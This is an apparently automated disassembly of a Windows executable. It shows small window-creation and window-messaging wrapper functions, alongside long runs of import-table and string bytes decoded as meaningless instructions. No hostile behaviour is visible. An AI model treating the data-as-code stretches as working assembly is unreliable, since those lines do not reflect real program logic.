push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
inc edi
add [ ebx + 0x25ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
push edx
inc edi
sar bh 0x25
clc
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc edi
add [ ebx - 0x13da0040 ] cl
push edx
inc edi
add [ ebx - 0x17da0040 ] cl
push edx
inc edi
add [ ebx - 0x1bda0040 ] cl
push edx
inc edi
add [ ebx - 0x1fda0040 ] cl
push edx
inc edi
add [ ebx - 0x23da0040 ] cl
push edx
inc edi
add [ ebx - 0x27da0040 ] cl
push edx
inc edi
add [ ebx - 0x2bda0040 ] cl
push edx
inc edi
add [ ebx - 0x2fda0040 ] cl
push edx
inc edi
add [ ebx - 0x33da0040 ] cl
push edx
inc edi
add [ ebx - 0x37da0040 ] cl
push edx
inc edi
add [ ebx - 0x3bda0040 ] cl
push edx
inc edi
add [ ebx - 0x3fda0040 ] cl
push edx
inc edi
add [ ebx - 0x43da0040 ] cl
push edx
inc edi
add [ ebx - 0x47da0040 ] cl
push edx
inc edi
add [ ebx - 0x4bda0040 ] cl
push edx
inc edi
add [ ebx - 0x4fda0040 ] cl
push edx
inc edi
add [ ebx - 0x53da0040 ] cl
push edx
inc edi
add [ ebx - 0x57da0040 ] cl
push edx
inc edi
add [ ebx - 0x5bda0040 ] cl
push edx
inc edi
add [ ebx - 0x5fda0040 ] cl
push edx
inc edi
add [ ebx - 0x63da0040 ] cl
push edx
inc edi
add [ ebx - 0x67da0040 ] cl
push edx
inc edi
add [ ebx - 0x6bda0040 ] cl
push edx
inc edi
add [ ebx - 0x6fda0040 ] cl
push edx
inc edi
add [ ebx - 0x73da0040 ] cl
push edx
inc edi
add [ ebx - 0x77da0040 ] cl
push edx
inc edi
add [ ebx - 0x7bda0040 ] cl
push edx
inc edi
add [ ebx - 0x7fda0040 ] cl
push edx
inc edi
add [ ebx + 0x7c25ffc0 ] cl
push edx
inc edi
add [ ebx + 0x7825ffc0 ] cl
push edx
inc edi
add [ ebx + 0x7425ffc0 ] cl
push edx
inc edi
add [ ebx + 0x7025ffc0 ] cl
push edx
inc edi
add [ ebx + 0x6c25ffc0 ] cl
push edx
inc edi
add [ ebx + 0x6825ffc0 ] cl
push edx
inc edi
add [ ebx + 0x6425ffc0 ] cl
push edx
inc edi
add [ ebx + 0x6025ffc0 ] cl
push edx
inc edi
add [ ebx + 0x5c25ffc0 ] cl
push edx
inc edi
add [ ebx + 0x5825ffc0 ] cl
push edx
inc edi
add [ ebx + 0x5425ffc0 ] cl
push edx
inc edi
add [ ebx + 0x5025ffc0 ] cl
push edx
inc edi
add [ ebx + 0x4c25ffc0 ] cl
push edx
inc edi
add [ ebx + 0x4825ffc0 ] cl
push edx
inc edi
add [ ebx + 0x4425ffc0 ] cl
push edx
inc edi
add [ ebx + 0x4025ffc0 ] cl
push edx
inc edi
add [ ebx + 0x3c25ffc0 ] cl
push edx
inc edi
add [ ebx + 0x3825ffc0 ] cl
push edx
inc edi
add [ ebx + 0x3425ffc0 ] cl
push edx
inc edi
add [ ebx + 0x3025ffc0 ] cl
push edx
inc edi
add [ ebx + 0x2c25ffc0 ] cl
push edx
inc edi
add [ ebx + 0x2825ffc0 ] cl
push edx
inc edi
add [ ebx + 0x2425ffc0 ] cl
push edx
inc edi
add [ ebx + 0x2025ffc0 ] cl
push edx
inc edi
add [ ebx + 0x1c25ffc0 ] cl
push edx
inc edi
add [ ebx + 0x1825ffc0 ] cl
push edx
inc edi
add [ ebx + 0x1425ffc0 ] cl
push edx
inc edi
add [ ebx + 0x1025ffc0 ] cl
push edx
inc edi
add [ ebx + 0x1c25ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x1825ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x1425ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x4025ffc0 ] cl
push esp
inc edi
add [ ebx + 0x3c25ffc0 ] cl
push esp
inc edi
add [ ebx + 0x3825ffc0 ] cl
push esp
inc edi
add [ ebx + 0x3425ffc0 ] cl
push esp
inc edi
add [ ebx + 0x3025ffc0 ] cl
push esp
inc edi
add [ ebx + 0x2c25ffc0 ] cl
push esp
inc edi
add [ ebx + 0x2825ffc0 ] cl
push esp
inc edi
add [ ebx + 0x2425ffc0 ] cl
push esp
inc edi
add [ ebx + 0x2025ffc0 ] cl
push esp
inc edi
add [ ebx + 0x1c25ffc0 ] cl
push esp
inc edi
add [ ebx + 0x1825ffc0 ] cl
push esp
inc edi
add [ ebx + 0x1425ffc0 ] cl
push esp
inc edi
add [ ebx + 0x1025ffc0 ] cl
push esp
inc edi
add [ ebx + 0xc25ffc0 ] cl
push esp
inc edi
add [ ebx + 0x825ffc0 ] cl
push esp
inc edi
add [ ebx + 0x425ffc0 ] cl
push esp
inc edi
add [ ebx + 0x25ffc0 ] cl
push esp
inc edi
add [ ebx - 0x3da0040 ] cl
push ebx
inc edi
add [ ebx - 0x7da0040 ] cl
push ebx
inc edi
add [ ebx - 0xbda0040 ] cl
push ebx
inc edi
add [ ebx - 0xfda0040 ] cl
push ebx
inc edi
add [ ebx - 0x13da0040 ] cl
push ebx
inc edi
add [ ebx - 0x17da0040 ] cl
push ebx
inc edi
add [ ebx - 0x1bda0040 ] cl
push ebx
inc edi
add [ ebx - 0x1fda0040 ] cl
push ebx
inc edi
add [ ebx - 0x23da0040 ] cl
push ebx
inc edi
add [ ebx - 0x27da0040 ] cl
push ebx
inc edi
add [ ebx - 0x2bda0040 ] cl
push ebx
inc edi
add [ ebx - 0x2fda0040 ] cl
push ebx
inc edi
add [ ebx - 0x33da0040 ] cl
push ebx
inc edi
add [ ebx - 0x37da0040 ] cl
push ebx
inc edi
add [ ebx - 0x3bda0040 ] cl
push ebx
inc edi
add [ ebx - 0x3fda0040 ] cl
push ebx
inc edi
add [ ebx - 0x43da0040 ] cl
push ebx
inc edi
add [ ebx - 0x47da0040 ] cl
push ebx
inc edi
add [ ebx - 0x4bda0040 ] cl
push ebx
inc edi
add [ ebx - 0x4fda0040 ] cl
push ebx
inc edi
add [ ebx - 0x53da0040 ] cl
push ebx
inc edi
add [ ebx - 0x57da0040 ] cl
push ebx
inc edi
add [ ebx - 0x5bda0040 ] cl
push ebx
inc edi
add [ ebx - 0x5fda0040 ] cl
push ebx
inc edi
add [ ebx - 0x63da0040 ] cl
push ebx
inc edi
add [ ebx - 0x67da0040 ] cl
push ebx
inc edi
add [ ebx - 0x6bda0040 ] cl
push ebx
inc edi
add [ ebx - 0x6fda0040 ] cl
push ebx
inc edi
add [ ebx - 0x73da0040 ] cl
push ebx
inc edi
add [ ebx - 0x77da0040 ] cl
push ebx
inc edi
add [ ebx - 0x7bda0040 ] cl
push ebx
inc edi
add [ ebx - 0x7fda0040 ] cl
push ebx
inc edi
add [ ebx + 0x7c25ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x7825ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x7425ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x7025ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x6c25ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x6825ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x6425ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x6025ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x5c25ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x5825ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x5425ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x5025ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x4c25ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x4825ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x4425ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x4025ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x3c25ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x3825ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x3425ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x3025ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x2c25ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x2825ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x2425ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x1025ffc0 ] cl
push edi
inc edi
add [ ebx + 0xc25ffc0 ] cl
push edi
inc edi
add [ ebx + 0x25ffc0 ] cl
push edi
inc edi
add [ ebx - 0xbda0040 ] cl
push esi
inc edi
add [ ebx - 0xfda0040 ] cl
push esi
inc edi
add [ ebx - 0x13da0040 ] cl
push esi
inc edi
add [ ebx - 0x17da0040 ] cl
push esi
inc edi
add [ ebx - 0x3da0040 ] cl
push esi
inc edi
add [ ebx - 0x7da0040 ] cl
push esi
inc edi
add [ ebx + 0x825ffc0 ] cl
push edi
inc edi
add [ ebx + 0x425ffc0 ] cl
push edi
inc edi
add [ ebx - 0x1bda0040 ] cl
push esi
inc edi
add [ ebx - 0x1fda0040 ] cl
push esi
inc edi
add [ ebx - 0x23da0040 ] cl
push esi
inc edi
add [ ebx - 0x27da0040 ] cl
push esi
inc edi
add [ ebx - 0x2bda0040 ] cl
push esi
inc edi
add [ ebx - 0x2fda0040 ] cl
push esi
inc edi
add [ ebx - 0x33da0040 ] cl
push esi
inc edi
add [ ebx - 0x37da0040 ] cl
push esi
inc edi
add [ ebx - 0x3bda0040 ] cl
push esi
inc edi
add [ ebx - 0x3fda0040 ] cl
push esi
inc edi
add [ ebx - 0x43da0040 ] cl
push esi
inc edi
add [ ebx - 0x47da0040 ] cl
push esi
inc edi
add [ ebx - 0x4bda0040 ] cl
push esi
inc edi
add [ ebx - 0x4fda0040 ] cl
push esi
inc edi
add [ ebx - 0x53da0040 ] cl
push esi
inc edi
add [ ebx - 0x57da0040 ] cl
push esi
inc edi
add [ ebx - 0x5bda0040 ] cl
push esi
inc edi
add [ ebx - 0x5fda0040 ] cl
push esi
inc edi
add [ ebx - 0x63da0040 ] cl
push esi
inc edi
add [ ebx - 0x67da0040 ] cl
push esi
inc edi
add [ ebx - 0x6bda0040 ] cl
push esi
inc edi
add [ ebx - 0x6fda0040 ] cl
push esi
inc edi
add [ ebx - 0x73da0040 ] cl
push esi
inc edi
add [ ebx - 0x77da0040 ] cl
push esi
inc edi
add [ ebx - 0x7bda0040 ] cl
push esi
inc edi
add [ ebx - 0x7fda0040 ] cl
push esi
inc edi
add [ ebx + 0x7c25ffc0 ] cl
push esi
inc edi
add [ ebx + 0x7825ffc0 ] cl
push esi
inc edi
add [ ebx + 0x7425ffc0 ] cl
push esi
inc edi
add [ ebx + 0x7025ffc0 ] cl
push esi
inc edi
add [ ebx + 0x6c25ffc0 ] cl
push esi
inc edi
add [ ebx + 0x6825ffc0 ] cl
push esi
inc edi
add [ ebx + 0x6425ffc0 ] cl
push esi
inc edi
add [ ebx + 0x6025ffc0 ] cl
push esi
inc edi
add [ ebx + 0x5c25ffc0 ] cl
push esi
inc edi
add [ ebx + 0x5825ffc0 ] cl
push esi
inc edi
add [ ebx + 0x5425ffc0 ] cl
push esi
inc edi
add [ ebx + 0x5025ffc0 ] cl
push esi
inc edi
add [ ebx + 0x4c25ffc0 ] cl
push esi
inc edi
add [ ebx + 0x4825ffc0 ] cl
push esi
inc edi
add [ ebx + 0x4425ffc0 ] cl
push esi
inc edi
add [ ebx + 0x4025ffc0 ] cl
push esi
inc edi
add [ ebx + 0x3c25ffc0 ] cl
push esi
inc edi
add [ ebx + 0x3825ffc0 ] cl
push esi
inc edi
add [ ebx + 0x3425ffc0 ] cl
push esi
inc edi
add [ ebx + 0x3025ffc0 ] cl
push esi
inc edi
add [ ebx + 0x2c25ffc0 ] cl
push esi
inc edi
add [ ebx + 0x2825ffc0 ] cl
push esi
inc edi
add [ ebx + 0x2425ffc0 ] cl
push esi
inc edi
add [ ebx + 0x2025ffc0 ] cl
push esi
inc edi
add [ ebx + 0x1c25ffc0 ] cl
push esi
inc edi
add [ ebx + 0x1825ffc0 ] cl
push esi
inc edi
add [ ebx + 0x1425ffc0 ] cl
push esi
inc edi
add [ ebx + 0x1025ffc0 ] cl
push esi
inc edi
add [ ebx + 0xc25ffc0 ] cl
push esi
inc edi
add [ ebx + 0x825ffc0 ] cl
push esi
inc edi
add [ ebx + 0x425ffc0 ] cl
push esi
inc edi
add [ ebx + 0x25ffc0 ] cl
push esi
inc edi
add [ ebx - 0x3da0040 ] cl
push ebp
inc edi
add [ ebx - 0x7da0040 ] cl
push ebp
inc edi
add [ ebx - 0xbda0040 ] cl
push ebp
inc edi
add [ ebx - 0xfda0040 ] cl
push ebp
inc edi
add [ ebx - 0x13da0040 ] cl
push ebp
inc edi
add [ ebx - 0x17da0040 ] cl
push ebp
inc edi
add [ ebx - 0x1bda0040 ] cl
push ebp
inc edi
add [ ebx - 0x1fda0040 ] cl
push ebp
inc edi
add [ ebx - 0x23da0040 ] cl
push ebp
inc edi
add [ ebx - 0x27da0040 ] cl
push ebp
inc edi
add [ ebx - 0x2bda0040 ] cl
push ebp
inc edi
add [ ebx - 0x2fda0040 ] cl
push ebp
inc edi
add [ ebx - 0x33da0040 ] cl
push ebp
inc edi
add [ ebx - 0x37da0040 ] cl
push ebp
inc edi
add [ ebx - 0x3bda0040 ] cl
push ebp
inc edi
add [ ebx - 0x3fda0040 ] cl
push ebp
inc edi
add [ ebx - 0x43da0040 ] cl
push ebp
inc edi
add [ ebx - 0x47da0040 ] cl
push ebp
inc edi
add [ ebx - 0x4bda0040 ] cl
push ebp
inc edi
add [ ebx - 0x4fda0040 ] cl
push ebp
inc edi
add [ ebx - 0x53da0040 ] cl
push ebp
inc edi
add [ ebx - 0x27da0040 ] cl
push ebp
inc edi
add [ ebx - 0x57da0040 ] cl
push ebp
inc edi
add [ ebx - 0x5bda0040 ] cl
push ebp
inc edi
add [ ebx - 0x5fda0040 ] cl
push ebp
inc edi
add [ ebx - 0x63da0040 ] cl
push ebp
inc edi
add [ ebx - 0x67da0040 ] cl
push ebp
inc edi
add [ ebx - 0x6bda0040 ] cl
push ebp
inc edi
add [ ebx - 0x6bda0040 ] cl
push ebp
inc edi
add [ ebx - 0x6fda0040 ] cl
push ebp
inc edi
add [ ebx - 0x73da0040 ] cl
push ebp
inc edi
add [ ebx - 0x77da0040 ] cl
push ebp
inc edi
add [ ebx - 0x7bda0040 ] cl
push ebp
inc edi
add [ ebx - 0x7fda0040 ] cl
push ebp
inc edi
add [ ebx + 0x7c25ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x7825ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x7425ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x7025ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x6c25ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x6825ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x6425ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x6025ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x5c25ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x5825ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x5425ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x5025ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x4c25ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x4825ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x4425ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x4025ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x3c25ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x3825ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x3425ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x3025ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x2c25ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x2825ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x2425ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x2025ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x1c25ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x1825ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x1425ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x1025ffc0 ] cl
push ebp
inc edi
add [ ebx + 0xc25ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x825ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x425ffc0 ] cl
push ebp
inc edi
add [ ebx + 0x25ffc0 ] cl
push ebp
inc edi
add [ ebx - 0x3da0040 ] cl
push esp
inc edi
add [ ebx - 0x7da0040 ] cl
push esp
inc edi
add [ ebx - 0xbda0040 ] cl
push esp
inc edi
add [ ebx - 0xfda0040 ] cl
push esp
inc edi
add [ ebx - 0x13da0040 ] cl
push esp
inc edi
add [ ebx - 0x17da0040 ] cl
push esp
inc edi
add [ ebx - 0x1bda0040 ] cl
push esp
inc edi
add [ ebx - 0x1fda0040 ] cl
push esp
inc edi
add [ ebx - 0x23da0040 ] cl
push esp
inc edi
add [ ebx - 0x27da0040 ] cl
push esp
inc edi
add [ ebx - 0x2bda0040 ] cl
push esp
inc edi
add [ ebx - 0x2fda0040 ] cl
push esp
inc edi
add [ ebx - 0x33da0040 ] cl
push esp
inc edi
add [ ebx - 0x37da0040 ] cl
push esp
inc edi
add [ ebx - 0x3bda0040 ] cl
push esp
inc edi
add [ ebx - 0x3fda0040 ] cl
push esp
inc edi
add [ ebx - 0x43da0040 ] cl
push esp
inc edi
add [ ebx - 0x47da0040 ] cl
push esp
inc edi
add [ ebx - 0x4bda0040 ] cl
push esp
inc edi
add [ ebx - 0x4fda0040 ] cl
push esp
inc edi
add [ ebx - 0x53da0040 ] cl
push esp
inc edi
add [ ebx - 0x57da0040 ] cl
push esp
inc edi
add [ ebx - 0x5bda0040 ] cl
push esp
inc edi
add [ ebx - 0x5fda0040 ] cl
push esp
inc edi
add [ ebx - 0x63da0040 ] cl
push esp
inc edi
add [ ebx - 0x67da0040 ] cl
push esp
inc edi
add [ ebx - 0x6bda0040 ] cl
push esp
inc edi
add [ ebx - 0x6fda0040 ] cl
push esp
inc edi
add [ ebx - 0x73da0040 ] cl
push esp
inc edi
add [ ebx - 0x77da0040 ] cl
push esp
inc edi
add [ ebx - 0x7bda0040 ] cl
push esp
inc edi
add [ ebx - 0x7fda0040 ] cl
push esp
inc edi
add [ ebx + 0x7c25ffc0 ] cl
push esp
inc edi
add [ ebx + 0x7825ffc0 ] cl
push esp
inc edi
add [ ebx + 0x7425ffc0 ] cl
push esp
inc edi
add [ ebx + 0x7025ffc0 ] cl
push esp
inc edi
add [ ebx + 0x6c25ffc0 ] cl
push esp
inc edi
add [ ebx + 0x6825ffc0 ] cl
push esp
inc edi
add [ ebx + 0x6425ffc0 ] cl
push esp
inc edi
add [ ebx + 0x6025ffc0 ] cl
push esp
inc edi
add [ ebx + 0x5c25ffc0 ] cl
push esp
inc edi
add [ ebx + 0x5825ffc0 ] cl
push esp
inc edi
add [ ebx + 0x5425ffc0 ] cl
push esp
inc edi
add [ ebx + 0x5025ffc0 ] cl
push esp
inc edi
add [ ebx + 0x4c25ffc0 ] cl
push esp
inc edi
add [ ebx - 0x3f48f040 ] cl
movzx edx dx
shl edx 0x10
or eax edx
retn
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x825ffc0 ] cl
push ebx
inc edi
add [ ebx + 0x425ffc0 ] cl
push ebx
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FindResourceA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
jo r-xdata
je r-xdata
add [ ebx - 0xbda0040 ] cl
push edx
inc edi
add [ ebx - 0xfda0040 ] cl
push edx
inc eax
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
mov eax eax
add edi [ esi + ebx * 2 - 0x3f74ffc0 ]
add [ ebx - 0x3da0040 ] cl
push edx
inc edi
add [ ebx - 0x7da0040 ] cl
sub_406a40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a60
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a50
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406a98
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a60
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a50
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406af0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406be5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406c0d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406c14
retn
sub_406c20
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406c45
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406c4c
retn
sub_406c58
inc esi
inc edi
add al dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add cl dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add dl dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add bl dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add ah dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add ch dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add dh dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add bh dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add al bh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add cl bh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add dl bh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add bl bh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add ah bh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add ch bh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add dh bh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add bh bh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add al ah
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add cl ah
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add dl ah
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add bl ah
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add ah ah
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add ch ah
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add dh ah
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add bh ah
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add al ch
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add cl ch
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add dl ch
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add bl ch
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add ah ch
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add ch ch
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add dh ch
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add bh ch
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add al dl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add cl dl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add dl dl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add bl dl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add ah dl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add ch dl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add dh dl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add bh dl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add al bl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add cl bl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add dl bl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add bl bl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add ah bl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add ch bl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add dh bl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add bh bl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add al al
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add cl al
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add dl al
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add bl al
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add ah al
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add ch al
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add dh al
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add bh al
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add al cl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add cl cl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add dl cl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add bl cl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add ah cl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add ch cl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add dh cl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add bh cl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ eax + 0x640000ff ] dh
inc esi
inc edi
add [ ecx + 0x640000ff ] dh
inc esi
inc edi
add [ edx + 0x640000ff ] dh
inc esi
inc edi
add [ ebx + 0x640000ff ] dh
inc esi
inc edi
add [ edi + edi * 8 + 0x46640000 ] dh
inc edi
add [ ebp + 0x640000ff ] dh
inc esi
inc edi
add [ esi + 0x640000ff ] dh
inc esi
inc edi
add [ edi + 0x640000ff ] dh
inc esi
inc edi
add [ eax + 0x640000ff ] bh
inc esi
inc edi
add [ ecx + 0x640000ff ] bh
inc esi
inc edi
add [ edx + 0x640000ff ] bh
inc esi
inc edi
add [ ebx + 0x640000ff ] bh
inc esi
inc edi
add [ edi + edi * 8 + 0x46640000 ] bh
inc edi
add [ ebp + 0x640000ff ] bh
inc esi
inc edi
add [ esi + 0x640000ff ] bh
inc esi
inc edi
add [ edi + 0x640000ff ] bh
inc esi
inc edi
add [ eax + 0x640000ff ] ah
inc esi
inc edi
add [ ecx + 0x640000ff ] ah
inc esi
inc edi
add [ edx + 0x640000ff ] ah
inc esi
inc edi
add [ ebx + 0x640000ff ] ah
inc esi
inc edi
